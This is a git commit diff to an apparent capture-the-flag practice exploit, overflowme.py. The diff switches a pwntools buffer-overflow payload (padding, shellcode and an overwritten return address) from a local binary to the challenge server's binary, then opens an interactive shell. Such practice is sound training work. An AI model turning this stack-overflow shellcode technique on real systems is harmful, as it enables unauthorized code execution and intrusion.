4a1fc3119779ca109d83904ece263c74dcf92908
Mem2019 <434791602@qq.com>
2018-03-02 22:11:08 +0000

    should solve

--- hackcenter/pwn/practice/overflowme.py
+++ hackcenter/pwn/practice/overflowme.py
@@ -6,8 +6,8 @@ padding = 0x20
 payload = ("A" * (overflow_len - len(shellcode) - padding)) + shellcode + "A"*padding + p32(0x8048615) * 3
 print hex(len(payload))
 print payload
-#sh = process(["/problems/b0b419078e5ac70c47a50b04b2aae2d9/overflowme", payload])
+sh = process(["/problems/b0b419078e5ac70c47a50b04b2aae2d9/overflowme", payload])
 #sh = gdb.debug(["./overflowme", payload], "b _start")
-sh = process(["./overflowme", payload])
+#sh = process(["./overflowme", payload])
 
 sh.interactive()
